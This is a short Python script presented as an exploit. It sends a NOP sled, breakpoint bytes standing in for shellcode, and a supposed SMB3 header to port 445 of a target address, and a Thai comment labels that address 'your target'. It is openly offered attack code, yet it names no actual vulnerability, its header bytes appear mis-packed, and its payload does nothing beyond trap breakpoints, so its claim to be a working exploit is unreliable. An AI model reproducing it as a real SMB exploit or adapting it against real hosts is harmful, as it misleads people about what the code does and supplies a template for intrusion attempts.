import socket
import struct

def exploit(target_ip):
    payload = b"\x90" * 1000  # NOP sled
    payload += b"\xcc" * 100  # Breakpoint shellcode

    smb_header = struct.pack("<IHH", 0xfe534d42, 0x72, 0x0000)  # SMB3 Header
    smb_data = smb_header + payload

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, 445))  # SMB port
    s.send(smb_data)
    s.close()

if __name__ == "__main__":
    target_ip = "192.168.1.10"  # เป้าหมายของคุณ
    exploit(target_ip)
